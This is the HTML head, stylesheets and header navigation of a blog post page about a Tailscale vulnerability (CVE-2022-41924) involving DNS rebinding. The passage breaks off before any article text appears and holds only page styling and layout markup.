<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" /><title>CVE-2022-41924 - RCE in Tailscale, DNS Rebinding, and You</title><meta name="description" content="TL;DR Recommendations" /><meta property="og:title" content="CVE-2022-41924 - RCE in Tailscale, DNS Rebinding, and You" /><meta property="og:description" content="TL;DR Recommendations" /><meta property="og:image" content="https://emily.id.au/files/banner.jpg" /><meta name="twitter:title" content="CVE-2022-41924 - RCE in Tailscale, DNS Rebinding, and You" /><meta name="twitter:description" content="TL;DR Recommendations" /><meta name="twitter:image" content="https://emily.id.au/files/banner.jpg" /><meta name="twitter:card" content="summary_large_image" /><link rel="canonical" href="https://emily.id.au/tailscale" /><link rel="icon" href="https://emily.id.au/files/avatar.webp" type="image/x-icon" /><style>.dark{color-scheme:dark}.dark ::-moz-selection{background:#444}.dark ::selection{background:#444}</style><style>/* reset */
*,:before,:after{box-sizing:border-box;border:0 solid}html{-webkit-text-size-adjust:100%;-moz-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;line-height:1.5}body{line-height:inherit;margin:0}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,samp,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace;font-size:1em}small{font-size:80%}sub,sup{vertical-align:baseline;font-size:75%;line-height:0;position:relative}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-size:100%;font-weight:inherit;line-height:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,[type=button],[type=reset],[type=submit]{-webkit-appearance:button;background-color:#0000;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:baseline}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dl,dd,h1,h2,h3,h4,h5,h6,hr,figure,p,pre{margin:0}fieldset{margin:0;padding:0}legend{padding:0}ol,ul,menu{margin:0;padding:0;list-style:none}textarea{resize:vertical}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}button,[role=button]{cursor:pointer}:disabled{cursor:default}img,svg,video,canvas,audio,iframe,embed,object{vertical-align:middle;display:block}img,video{max-width:100%;height:auto}
</style><style>/* layer: preflights */
*,::before,::after{--un-rotate:0;--un-rotate-x:0;--un-rotate-y:0;--un-rotate-z:0;--un-scale-x:1;--un-scale-y:1;--un-scale-z:1;--un-skew-x:0;--un-skew-y:0;--un-translate-x:0;--un-translate-y:0;--un-translate-z:0;--un-pan-x: ;--un-pan-y: ;--un-pinch-zoom: ;--un-scroll-snap-strictness:proximity;--un-ordinal: ;--un-slashed-zero: ;--un-numeric-figure: ;--un-numeric-spacing: ;--un-numeric-fraction: ;--un-border-spacing-x:0;--un-border-spacing-y:0;--un-ring-offset-shadow:0 0 rgba(0,0,0,0);--un-ring-shadow:0 0 rgba(0,0,0,0);--un-shadow-inset: ;--un-shadow:0 0 rgba(0,0,0,0);--un-ring-inset: ;--un-ring-offset-width:0px;--un-ring-offset-color:#fff;--un-ring-width:0px;--un-ring-color:rgba(147,197,253,0.5);--un-blur: ;--un-brightness: ;--un-contrast: ;--un-drop-shadow: ;--un-grayscale: ;--un-hue-rotate: ;--un-invert: ;--un-saturate: ;--un-sepia: ;--un-backdrop-blur: ;--un-backdrop-brightness: ;--un-backdrop-contrast: ;--un-backdrop-grayscale: ;--un-backdrop-hue-rotate: ;--un-backdrop-invert: ;--un-backdrop-opacity: ;--un-backdrop-saturate: ;--un-backdrop-sepia: ;}::backdrop{--un-rotate:0;--un-rotate-x:0;--un-rotate-y:0;--un-rotate-z:0;--un-scale-x:1;--un-scale-y:1;--un-scale-z:1;--un-skew-x:0;--un-skew-y:0;--un-translate-x:0;--un-translate-y:0;--un-translate-z:0;--un-pan-x: ;--un-pan-y: ;--un-pinch-zoom: ;--un-scroll-snap-strictness:proximity;--un-ordinal: ;--un-slashed-zero: ;--un-numeric-figure: ;--un-numeric-spacing: ;--un-numeric-fraction: ;--un-border-spacing-x:0;--un-border-spacing-y:0;--un-ring-offset-shadow:0 0 rgba(0,0,0,0);--un-ring-shadow:0 0 rgba(0,0,0,0);--un-shadow-inset: ;--un-shadow:0 0 rgba(0,0,0,0);--un-ring-inset: ;--un-ring-offset-width:0px;--un-ring-offset-color:#fff;--un-ring-width:0px;--un-ring-color:rgba(147,197,253,0.5);--un-blur: ;--un-brightness: ;--un-contrast: ;--un-drop-shadow: ;--un-grayscale: ;--un-hue-rotate: ;--un-invert: ;--un-saturate: ;--un-sepia: ;--un-backdrop-blur: ;--un-backdrop-brightness: ;--un-backdrop-contrast: ;--un-backdrop-grayscale: ;--un-backdrop-hue-rotate: ;--un-backdrop-invert: ;--un-backdrop-opacity: ;--un-backdrop-saturate: ;--un-backdrop-sepia: ;}
/* layer: default */
.absolute{position:absolute;}
.relative{position:relative;}
.top-10{top:2.5rem;}
.mx-auto{margin-left:auto;margin-right:auto;}
.my{margin-top:1rem;margin-bottom:1rem;}
.me{margin-inline-end:1rem;}
.mt-1{margin-top:0.25rem;}
.mt-20{margin-top:5rem;}
.mt-3{margin-top:0.75rem;}
.mt-8{margin-top:2rem;}
.block{display:block;}
.inline-block{display:inline-block;}
.h-25{height:6.25rem;}
.h-4{height:1rem;}
.h-5{height:1.25rem;}
.h-8{height:2rem;}
.h-80{height:20rem;}
.h-full{height:100%;}
.w-25{width:6.25rem;}
.w-4{width:1rem;}
.w-5{width:1.25rem;}
.w-8{width:2rem;}
.w-full{width:100%;}
.max-w-screen-lg{max-width:1024px;}
.flex{display:flex;}
.inline-flex{display:inline-flex;}
.flex-col{flex-direction:column;}
.items-center{align-items:center;}
.justify-center{justify-content:center;}
.gap-1{grid-gap:0.25rem;gap:0.25rem;}
.gap-2{grid-gap:0.5rem;gap:0.5rem;}
.gap-2\.5{grid-gap:0.625rem;gap:0.625rem;}
.whitespace-nowrap{white-space:nowrap;}
.border-4{border-width:4px;border-style:solid;}
.border-white{--un-border-opacity:1;border-color:rgba(255,255,255,var(--un-border-opacity));}
.rounded-full{border-radius:9999px;}
.rounded-md{border-radius:0.375rem;}
.bg-black\/80{background-color:rgba(0,0,0,0.8);}
.bg-gray-600\/10{background-color:rgba(75,85,99,0.1);}
.dark .dark\:bg-gray-400\/10{background-color:rgba(156,163,175,0.1);}
.dark .dark\:hover\:bg-gray-400\/15:hover{background-color:rgba(156,163,175,0.15);}
.hover\:bg-gray-600\/15:hover{background-color:rgba(75,85,99,0.15);}
.bg-cover{background-size:cover;}
.bg-center{background-position:center;}
.bg-no-repeat{background-repeat:no-repeat;}
.px-3{padding-left:0.75rem;padding-right:0.75rem;}
.px-6{padding-left:1.5rem;padding-right:1.5rem;}
.pb-16{padding-bottom:4rem;}
.pb-8{padding-bottom:2rem;}
.pt-8{padding-top:2rem;}
.text-4xl{font-size:2.25rem;line-height:2.5rem;}
.text-lg{font-size:1.125rem;line-height:1.75rem;}
.text-sm{font-size:0.875rem;line-height:1.25rem;}
.font-bold{font-weight:700;}
.\!leading-8{line-height:2rem !important;}
.dark .dark\:hover\:text-gray-200:hover{--un-text-opacity:1;color:rgba(229,231,235,var(--un-text-opacity));}
.dark .dark\:hover\:text-white:hover,
.text-white{--un-text-opacity:1;color:rgba(255,255,255,var(--un-text-opacity));}
.dark .dark\:text-gray-100{--un-text-opacity:1;color:rgba(243,244,246,var(--un-text-opacity));}
.dark .dark\:text-gray-400{--un-text-opacity:1;color:rgba(156,163,175,var(--un-text-opacity));}
.dark .dark\:text-gray-500\/800{color:rgba(107,114,128,8);}
.hover\:text-black:hover{--un-text-opacity:1;color:rgba(0,0,0,var(--un-text-opacity));}
.hover\:text-gray-700:hover,
.text-gray-700{--un-text-opacity:1;color:rgba(55,65,81,var(--un-text-opacity));}
.hover\:text-gray-800:hover{--un-text-opacity:1;color:rgba(31,41,55,var(--un-text-opacity));}
.text-black\/80{color:rgba(0,0,0,0.8);}
.text-gray-400\/800{color:rgba(156,163,175,8);}
.text-gray-500{--un-text-opacity:1;color:rgba(107,114,128,var(--un-text-opacity));}
.text-gray-500\/80{color:rgba(107,114,128,0.8);}
.text-gray-600{--un-text-opacity:1;color:rgba(75,85,99,var(--un-text-opacity));}
.text-gray-900{--un-text-opacity:1;color:rgba(17,24,39,var(--un-text-opacity));}
.underline{text-decoration-line:underline;}
.group:focus .group-focus\:opacity-100,
.group:hover .group-hover\:opacity-100{opacity:1;}
.opacity-0{opacity:0;}
.transition-colors{transition-property:color,background-color,border-color,text-decoration-color,fill,stroke;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms;}
.transition-opacity{transition-property:opacity;transition-timing-function:cubic-bezier(0.4, 0, 0.2, 1);transition-duration:150ms;}
@media (max-width: 639.9px){
.lt-sm\:mt-16{margin-top:4rem;}
.lt-sm\:h-80{height:20rem;}
.lt-sm\:pb-8{padding-bottom:2rem;}
}</style><style>:root,[data-color-mode=light][data-light-theme=light],[data-color-mode=dark][data-dark-theme=light]{--color-canvas-default-transparent:rgba(255,255,255,0);--color-prettylights-syntax-comment:#6e7781;--color-prettylights-syntax-constant:#0550ae;--color-prettylights-syntax-entity:#8250df;--color-prettylights-syntax-storage-modifier-import:#24292f;--color-prettylights-syntax-entity-tag:#116329;--color-prettylights-syntax-keyword:#cf222e;--color-prettylights-syntax-string:#0a3069;--color-prettylights-syntax-variable:#953800;--color-prettylights-syntax-string-regexp:#116329;--color-prettylights-syntax-markup-deleted-text:#82071e;--color-prettylights-syntax-markup-deleted-bg:#ffebe9;--color-prettylights-syntax-markup-inserted-text:#116329;--color-prettylights-syntax-markup-inserted-bg:#dafbe1;--color-prettylights-syntax-constant-other-reference-link:#0a3069;--color-fg-default:#24292f;--color-fg-muted:#57606a;--color-canvas-default:#fff;--color-canvas-subtle:#f6f8fa;--color-border-default:#d0d7de;--color-border-muted:#d8dee4;--color-neutral-muted:rgba(175,184,193,.2);--color-accent-fg:#0969da;--color-accent-emphasis:#0969da;--color-danger-fg:#cf222e}@media (prefers-color-scheme:light){[data-color-mode=auto][data-light-theme=light]{--color-canvas-default-transparent:rgba(255,255,255,0);--color-prettylights-syntax-comment:#6e7781;--color-prettylights-syntax-constant:#0550ae;--color-prettylights-syntax-entity:#8250df;--color-prettylights-syntax-storage-modifier-import:#24292f;--color-prettylights-syntax-entity-tag:#116329;--color-prettylights-syntax-keyword:#cf222e;--color-prettylights-syntax-string:#0a3069;--color-prettylights-syntax-variable:#953800;--color-prettylights-syntax-string-regexp:#116329;--color-prettylights-syntax-markup-deleted-text:#82071e;--color-prettylights-syntax-markup-deleted-bg:#ffebe9;--color-prettylights-syntax-markup-inserted-text:#116329;--color-prettylights-syntax-markup-inserted-bg:#dafbe1;--color-prettylights-syntax-constant-other-reference-link:#0a3069;--color-fg-default:#24292f;--color-fg-muted:#57606a;--color-canvas-default:#fff;--color-canvas-subtle:#f6f8fa;--color-border-default:#d0d7de;--color-border-muted:#d8dee4;--color-neutral-muted:rgba(175,184,193,.2);--color-accent-fg:#0969da;--color-accent-emphasis:#0969da;--color-danger-fg:#cf222e}}@media (prefers-color-scheme:dark){[data-color-mode=auto][data-dark-theme=light]{--color-canvas-default-transparent:rgba(255,255,255,0);--color-prettylights-syntax-comment:#6e7781;--color-prettylights-syntax-constant:#0550ae;--color-prettylights-syntax-entity:#8250df;--color-prettylights-syntax-storage-modifier-import:#24292f;--color-prettylights-syntax-entity-tag:#116329;--color-prettylights-syntax-keyword:#cf222e;--color-prettylights-syntax-string:#0a3069;--color-prettylights-syntax-variable:#953800;--color-prettylights-syntax-string-regexp:#116329;--color-prettylights-syntax-markup-deleted-text:#82071e;--color-prettylights-syntax-markup-deleted-bg:#ffebe9;--color-prettylights-syntax-markup-inserted-text:#116329;--color-prettylights-syntax-markup-inserted-bg:#dafbe1;--color-prettylights-syntax-constant-other-reference-link:#0a3069;--color-fg-default:#24292f;--color-fg-muted:#57606a;--color-canvas-default:#fff;--color-canvas-subtle:#f6f8fa;--color-border-default:#d0d7de;--color-border-muted:#d8dee4;--color-neutral-muted:rgba(175,184,193,.2);--color-accent-fg:#0969da;--color-accent-emphasis:#0969da;--color-danger-fg:#cf222e}}[data-color-mode=light][data-light-theme=dark],[data-color-mode=dark][data-dark-theme=dark]{--color-canvas-default-transparent:rgba(13,17,23,0);--color-prettylights-syntax-comment:#8b949e;--color-prettylights-syntax-constant:#79c0ff;--color-prettylights-syntax-entity:#d2a8ff;--color-prettylights-syntax-storage-modifier-import:#c9d1d9;--color-prettylights-syntax-entity-tag:#7ee787;--color-prettylights-syntax-keyword:#ff7b72;--color-prettylights-syntax-string:#a5d6ff;--color-prettylights-syntax-variable:#ffa657;--color-prettylights-syntax-string-regexp:#7ee787;--color-prettylights-syntax-markup-deleted-text:#ffdcd7;--color-prettylights-syntax-markup-deleted-bg:#67060c;--color-prettylights-syntax-markup-inserted-text:#aff5b4;--color-prettylights-syntax-markup-inserted-bg:#033a16;--color-prettylights-syntax-constant-other-reference-link:#a5d6ff;--color-fg-default:#c9d1d9;--color-fg-muted:#8b949e;--color-canvas-default:#0d1117;--color-canvas-subtle:#161b22;--color-border-default:#30363d;--color-border-muted:#21262d;--color-neutral-muted:rgba(110,118,129,.4);--color-accent-fg:#58a6ff;--color-accent-emphasis:#1f6feb;--color-danger-fg:#f85149}@media (prefers-color-scheme:light){[data-color-mode=auto][data-light-theme=dark]{--color-canvas-default-transparent:rgba(13,17,23,0);--color-prettylights-syntax-comment:#8b949e;--color-prettylights-syntax-constant:#79c0ff;--color-prettylights-syntax-entity:#d2a8ff;--color-prettylights-syntax-storage-modifier-import:#c9d1d9;--color-prettylights-syntax-entity-tag:#7ee787;--color-prettylights-syntax-keyword:#ff7b72;--color-prettylights-syntax-string:#a5d6ff;--color-prettylights-syntax-variable:#ffa657;--color-prettylights-syntax-string-regexp:#7ee787;--color-prettylights-syntax-markup-deleted-text:#ffdcd7;--color-prettylights-syntax-markup-deleted-bg:#67060c;--color-prettylights-syntax-markup-inserted-text:#aff5b4;--color-prettylights-syntax-markup-inserted-bg:#033a16;--color-prettylights-syntax-constant-other-reference-link:#a5d6ff;--color-fg-default:#c9d1d9;--color-fg-muted:#8b949e;--color-canvas-default:#0d1117;--color-canvas-subtle:#161b22;--color-border-default:#30363d;--color-border-muted:#21262d;--color-neutral-muted:rgba(110,118,129,.4);--color-accent-fg:#58a6ff;--color-accent-emphasis:#1f6feb;--color-danger-fg:#f85149}}@media (prefers-color-scheme:dark){[data-color-mode=auto][data-dark-theme=dark]{--color-canvas-default-transparent:rgba(13,17,23,0);--color-prettylights-syntax-comment:#8b949e;--color-prettylights-syntax-constant:#79c0ff;--color-prettylights-syntax-entity:#d2a8ff;--color-prettylights-syntax-storage-modifier-import:#c9d1d9;--color-prettylights-syntax-entity-tag:#7ee787;--color-prettylights-syntax-keyword:#ff7b72;--color-prettylights-syntax-string:#a5d6ff;--color-prettylights-syntax-variable:#ffa657;--color-prettylights-syntax-string-regexp:#7ee787;--color-prettylights-syntax-markup-deleted-text:#ffdcd7;--color-prettylights-syntax-markup-deleted-bg:#67060c;--color-prettylights-syntax-markup-inserted-text:#aff5b4;--color-prettylights-syntax-markup-inserted-bg:#033a16;--color-prettylights-syntax-constant-other-reference-link:#a5d6ff;--color-fg-default:#c9d1d9;--color-fg-muted:#8b949e;--color-canvas-default:#0d1117;--color-canvas-subtle:#161b22;--color-border-default:#30363d;--color-border-muted:#21262d;--color-neutral-muted:rgba(110,118,129,.4);--color-accent-fg:#58a6ff;--color-accent-emphasis:#1f6feb;--color-danger-fg:#f85149}}.markdown-body{word-wrap:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Noto Sans,Helvetica,Arial,sans-serif,Apple Color Emoji,Segoe UI Emoji;font-size:16px;line-height:1.5}.markdown-body:before{content:"";display:table}.markdown-body:after{clear:both;content:"";display:table}.markdown-body>:first-child{margin-top:0!important}.markdown-body>:last-child{margin-bottom:0!important}.markdown-body a:not([href]){color:inherit;text-decoration:none}.markdown-body .absent{color:var(--color-danger-fg)}.markdown-body .anchor{float:left;margin-left:-20px;padding-right:4px;line-height:1}.markdown-body .anchor:focus{outline:none}.markdown-body p,.markdown-body blockquote,.markdown-body ul,.markdown-body ol,.markdown-body dl,.markdown-body table,.markdown-body pre,.markdown-body details{margin-top:0;margin-bottom:16px}.markdown-body hr{height:.25em;background-color:var(--color-border-default);border:0;margin:24px 0;padding:0}.markdown-body blockquote{color:var(--color-fg-muted);border-left:.25em solid var(--color-border-default);padding:0 1em}.markdown-body blockquote>:first-child{margin-top:0}.markdown-body blockquote>:last-child{margin-bottom:0}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{font-weight:var(--base-text-weight-semibold,600);margin-top:24px;margin-bottom:16px;line-height:1.25}.markdown-body h1 .octicon-link,.markdown-body h2 .octicon-link,.markdown-body h3 .octicon-link,.markdown-body h4 .octicon-link,.markdown-body h5 .octicon-link,.markdown-body h6 .octicon-link{color:var(--color-fg-default);vertical-align:middle;visibility:hidden}.markdown-body h1:hover .anchor,.markdown-body h2:hover .anchor,.markdown-body h3:hover .anchor,.markdown-body h4:hover .anchor,.markdown-body h5:hover .anchor,.markdown-body h6:hover .anchor{text-decoration:none}.markdown-body h1:hover .anchor .octicon-link,.markdown-body h2:hover .anchor .octicon-link,.markdown-body h3:hover .anchor .octicon-link,.markdown-body h4:hover .anchor .octicon-link,.markdown-body h5:hover .anchor .octicon-link,.markdown-body h6:hover .anchor .octicon-link{visibility:visible}.markdown-body h1 tt,.markdown-body h1 code,.markdown-body h2 tt,.markdown-body h2 code,.markdown-body h3 tt,.markdown-body h3 code,.markdown-body h4 tt,.markdown-body h4 code,.markdown-body h5 tt,.markdown-body h5 code,.markdown-body h6 tt,.markdown-body h6 code{font-size:inherit;padding:0 .2em}.markdown-body h1{border-bottom:1px solid var(--color-border-muted);padding-bottom:.3em;font-size:2em}.markdown-body h2{border-bottom:1px solid var(--color-border-muted);padding-bottom:.3em;font-size:1.5em}.markdown-body h3{font-size:1.25em}.markdown-body h4{font-size:1em}.markdown-body h5{font-size:.875em}.markdown-body h6{color:var(--color-fg-muted);font-size:.85em}.markdown-body summary h1,.markdown-body summary h2,.markdown-body summary h3,.markdown-body summary h4,.markdown-body summary h5,.markdown-body summary h6{display:inline-block}.markdown-body summary h1 .anchor,.markdown-body summary h2 .anchor,.markdown-body summary h3 .anchor,.markdown-body summary h4 .anchor,.markdown-body summary h5 .anchor,.markdown-body summary h6 .anchor{margin-left:-40px}.markdown-body summary h1,.markdown-body summary h2{border-bottom:0;padding-bottom:0}.markdown-body ul,.markdown-body ol{padding-left:2em}.markdown-body ul.no-list,.markdown-body ol.no-list{padding:0;list-style-type:none}.markdown-body ol[type=a]{list-style-type:lower-alpha}.markdown-body ol[type=A]{list-style-type:upper-alpha}.markdown-body ol[type=i]{list-style-type:lower-roman}.markdown-body ol[type=I]{list-style-type:upper-roman}.markdown-body ol[type="1"]{list-style-type:decimal}.markdown-body div>ol:not([type]){list-style-type:decimal}.markdown-body ul ul,.markdown-body ul ol,.markdown-body ol ol,.markdown-body ol ul{margin-top:0;margin-bottom:0}.markdown-body li>p{margin-top:16px}.markdown-body li+li{margin-top:.25em}.markdown-body dl{padding:0}.markdown-body dl dt{font-size:1em;font-style:italic;font-weight:var(--base-text-weight-semibold,600);margin-top:16px;padding:0}.markdown-body dl dd{margin-bottom:16px;padding:0 16px}.markdown-body table{width:100%;width:-webkit-max-content;width:-webkit-max-content;width:max-content;max-width:100%;display:block;overflow:auto}.markdown-body table th{font-weight:var(--base-text-weight-semibold,600)}.markdown-body table th,.markdown-body table td{border:1px solid var(--color-border-default);padding:6px 13px}.markdown-body table tr{background-color:var(--color-canvas-default);border-top:1px solid var(--color-border-muted)}.markdown-body table tr:nth-child(2n){background-color:var(--color-canvas-subtle)}.markdown-body table img{background-color:transparent}.markdown-body img{max-width:100%;box-sizing:content-box;background-color:var(--color-canvas-default)}.markdown-body img[align=right]{padding-left:20px}.markdown-body img[align=left]{padding-right:20px}.markdown-body .emoji{max-width:none;vertical-align:text-top;background-color:transparent}.markdown-body span.frame{display:block;overflow:hidden}.markdown-body span.frame>span{float:left;width:auto;border:1px solid var(--color-border-default);margin:13px 0 0;padding:7px;display:block;overflow:hidden}.markdown-body span.frame span img{float:left;display:block}.markdown-body span.frame span span{clear:both;color:var(--color-fg-default);padding:5px 0 0;display:block}.markdown-body span.align-center{clear:both;display:block;overflow:hidden}.markdown-body span.align-center>span{text-align:center;margin:13px auto 0;display:block;overflow:hidden}.markdown-body span.align-center span img{text-align:center;margin:0 auto}.markdown-body span.align-right{clear:both;display:block;overflow:hidden}.markdown-body span.align-right>span{text-align:right;margin:13px 0 0;display:block;overflow:hidden}.markdown-body span.align-right span img{text-align:right;margin:0}.markdown-body span.float-left{float:left;margin-right:13px;display:block;overflow:hidden}.markdown-body span.float-left span{margin:13px 0 0}.markdown-body span.float-right{float:right;margin-left:13px;display:block;overflow:hidden}.markdown-body span.float-right>span{text-align:right;margin:13px auto 0;display:block;overflow:hidden}.markdown-body code,.markdown-body tt{white-space:break-spaces;background-color:var(--color-neutral-muted);border-radius:6px;margin:0;padding:.2em .4em;font-size:85%}.markdown-body code br,.markdown-body tt br{display:none}.markdown-body del code{-webkit-text-decoration:inherit;-webkit-text-decoration:inherit;text-decoration:inherit}.markdown-body samp{font-size:85%}.markdown-body pre{word-wrap:normal}.markdown-body pre code{font-size:100%}.markdown-body pre>code{word-break:normal;white-space:pre;background:0 0;border:0;margin:0;padding:0}.markdown-body .highlight{margin-bottom:16px}.markdown-body .highlight pre{word-break:normal;margin-bottom:0}.markdown-body .highlight pre,.markdown-body pre{background-color:var(--color-canvas-subtle);border-radius:6px;padding:16px;font-size:85%;line-height:1.45;overflow:auto}.markdown-body pre code,.markdown-body pre tt{max-width:auto;line-height:inherit;word-wrap:normal;background-color:transparent;border:0;margin:0;padding:0;display:inline;overflow:visible}.markdown-body .csv-data td,.markdown-body .csv-data th{text-align:left;white-space:nowrap;padding:5px;font-size:12px;line-height:1;overflow:hidden}.markdown-body .csv-data .blob-num{text-align:right;background:var(--color-canvas-default);border:0;padding:10px 8px 9px}.markdown-body .csv-data tr{border-top:0}.markdown-body .csv-data th{font-weight:var(--base-text-weight-semibold,600);background:var(--color-canvas-subtle);border-top:0}.markdown-body [data-footnote-ref]:before{content:"["}.markdown-body [data-footnote-ref]:after{content:"]"}.markdown-body .footnotes{color:var(--color-fg-muted);border-top:1px solid var(--color-border-default);font-size:12px}.markdown-body .footnotes ol{padding-left:16px}.markdown-body .footnotes ol ul{margin-top:16px;padding-left:16px;display:inline-block}.markdown-body .footnotes li{position:relative}.markdown-body .footnotes li:target:before{pointer-events:none;content:"";border:2px solid var(--color-accent-emphasis);border-radius:6px;position:absolute;top:-8px;bottom:-8px;left:-24px;right:-8px}.markdown-body .footnotes li:target{color:var(--color-fg-default)}.markdown-body .footnotes .data-footnote-backref g-emoji{font-family:monospace}.markdown-body{background-color:var(--color-canvas-default);color:var(--color-fg-default)}.markdown-body a{color:var(--color-accent-fg);text-decoration:none}.markdown-body a:hover{text-decoration:underline}.markdown-body img[align=center]{margin:0 auto}.markdown-body iframe{background-color:#fff;border:0;margin-bottom:16px}.markdown-body svg.octicon{fill:currentColor}.markdown-body .anchor>.octicon{display:inline}.markdown-body figcaption{text-align:center;padding-top:2px}.markdown-body .highlight .token.keyword,.gfm-highlight .token.keyword{color:var(--color-prettylights-syntax-keyword)}.markdown-body .highlight .token.tag .token.class-name,.markdown-body .highlight .token.tag .token.script .token.punctuation,.gfm-highlight .token.tag .token.class-name,.gfm-highlight .token.tag .token.script .token.punctuation{color:var(--color-prettylights-syntax-storage-modifier-import)}.markdown-body .highlight .token.operator,.markdown-body .highlight .token.number,.markdown-body .highlight .token.boolean,.markdown-body .highlight .token.tag .token.punctuation,.markdown-body .highlight .token.tag .token.script .token.script-punctuation,.markdown-body .highlight .token.tag .token.attr-name,.gfm-highlight .token.operator,.gfm-highlight .token.number,.gfm-highlight .token.boolean,.gfm-highlight .token.tag .token.punctuation,.gfm-highlight .token.tag .token.script .token.script-punctuation,.gfm-highlight .token.tag .token.attr-name{color:var(--color-prettylights-syntax-constant)}.markdown-body .highlight .token.function,.gfm-highlight .token.function{color:var(--color-prettylights-syntax-entity)}.markdown-body .highlight .token.string,.gfm-highlight .token.string{color:var(--color-prettylights-syntax-string)}.markdown-body .highlight .token.comment,.gfm-highlight .token.comment{color:var(--color-prettylights-syntax-comment)}.markdown-body .highlight .token.class-name,.gfm-highlight .token.class-name{color:var(--color-prettylights-syntax-variable)}.markdown-body .highlight .token.regex,.gfm-highlight .token.regex{color:var(--color-prettylights-syntax-string)}.markdown-body .highlight .token.regex .regex-delimiter,.gfm-highlight .token.regex .regex-delimiter{color:var(--color-prettylights-syntax-constant)}.markdown-body .highlight .token.tag .token.tag,.markdown-body .highlight .token.property,.gfm-highlight .token.tag .token.tag,.gfm-highlight .token.property{color:var(--color-prettylights-syntax-entity-tag)}.markdown-body .highlight .token.deleted,.gfm-highlight .token.deleted{color:var(--color-prettylights-syntax-markup-deleted-text);background-color:var(--color-prettylights-syntax-markup-deleted-bg)}.markdown-body .highlight .token.inserted,.gfm-highlight .token.inserted{color:var(--color-prettylights-syntax-markup-inserted-text);background-color:var(--color-prettylights-syntax-markup-inserted-bg)}</style><style>.markdown-body { --color-canvas-default: transparent !important; --color-canvas-subtle: #edf0f2; --color-border-muted: rgba(128,128,128,0.2); } .markdown-body img + p { margin-top: 16px; }</style><style>@media only screen and (min-width: 768px) { .issue-panel {float:right;width:50%;max-width: 320px;margin-left:10px;border:1px solid black;} } .issue-panel {border:1px solid black; margin-left: 10px; margin-right: 10px;padding-left:10px;padding-right:10px;} .issue-panel h3 {margin-bottom: 10px !important; margin-top: 10px !important;} .issue-panel p:last-child {margin-bottom: 10px!important;} ol,ul{list-style-type:revert !important;}</style><script>(()=>{let v=localStorage.getItem("color-scheme"),a=window.matchMedia("(prefers-color-scheme: dark)").matches,cl=document.documentElement.classList,setColorScheme=v=>(!v||v==="auto"?a:v==="dark")?cl.add("dark"):cl.remove("dark");setColorScheme(v);window.setColorScheme=v=>{setColorScheme(v);localStorage.setItem("color-scheme",v)};})();</script></head><body><div class="post tailscale"><header class="w-full h-80 lt-sm:h-80 bg-cover bg-center bg-no-repeat"><div class="max-w-screen-lg h-full px-6 mx-auto flex flex-col items-center justify-center"><a href="/" class="bg-cover bg-center bg-no-repeat w-25 h-25 border-4 border-white rounded-full" style="background-image: url(https://emily.id.au/files/avatar.webp);"></a><h1 class="mt-3 text-4xl text-gray-900 dark:text-gray-100 font-bold">Emily Trau</h1><p class="text-lg text-gray-600 dark:text-gray-400">🏳️‍🌈</p><nav class="mt-3 flex gap-2"><a class="relative flex items-center justify-center w-8 h-8 rounded-full bg-gray-600/10 dark:bg-gray-400/10 text-gray-700 dark:text-gray-400 hover:bg-gray-600/15 dark:hover:bg-gray-400/15 hover:text-black dark:hover:text-white transition-colors group" href="https://github.com/emilytrau" rel="noopener noreferrer" target="_blank"><svg class="inline-block w-5 h-5" viewBox="0 0 20 20" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M10 2C5.58161 2 2 5.67194 2 10.2029C2 13.8265 4.292 16.9015 7.4712 17.9857C7.8712 18.0611 8.01681 17.808 8.01681 17.5902C8.01681 17.3961 8.01042 16.8794 8.00641 16.1956C5.7808 16.6911 5.3112 15.0959 5.3112 15.0959C4.948 14.1476 4.4232 13.8954 4.4232 13.8954C3.69681 13.3876 4.47841 13.3975 4.47841 13.3975C5.28081 13.4548 5.70322 14.2426 5.70322 14.2426C6.41683 15.4955 7.57603 15.1335 8.03122 14.9239C8.10481 14.3941 8.31122 14.033 8.54002 13.8282C6.76402 13.621 4.896 12.9168 4.896 9.77384C4.896 8.87877 5.208 8.14588 5.7192 7.57263C5.6368 7.36544 5.36241 6.531 5.79759 5.40254C5.79759 5.40254 6.46959 5.18143 7.99759 6.24272C8.59777 6.06848 9.28719 5.96782 9.99941 5.96674C10.6794 5.97002 11.364 6.06092 12.0032 6.24272C13.5304 5.18143 14.2008 5.40171 14.2008 5.40171C14.6376 6.53097 14.3624 7.36543 14.2808 7.5726C14.7928 8.14583 15.1032 8.87874 15.1032 9.7738C15.1032 12.9249 13.232 13.6185 11.4504 13.8216C11.7376 14.0747 11.9928 14.575 11.9928 15.3407C11.9928 16.4364 11.9832 17.3216 11.9832 17.5902C11.9832 17.8097 12.1272 18.0652 12.5336 17.9849C15.7378 16.8608 18 13.8039 18 10.2062C18 10.2051 18 10.2039 18 10.2027C18 5.67175 14.4176 2 10 2Z" fill="currentColor"></path></svg><div class="absolute top-10 px-3 h-8 !leading-8 bg-black/80 text-white text-sm rounded-md whitespace-nowrap opacity-0 group-hover:opacity-100 group-focus:opacity-100 transition-opacity"><span class="block absolute text-black/80" style="top: -4px; left: 50%; margin-left: -4.5px; width: 9px; height: 4px;"><svg class="absolute" width="9" height="4" viewBox="0 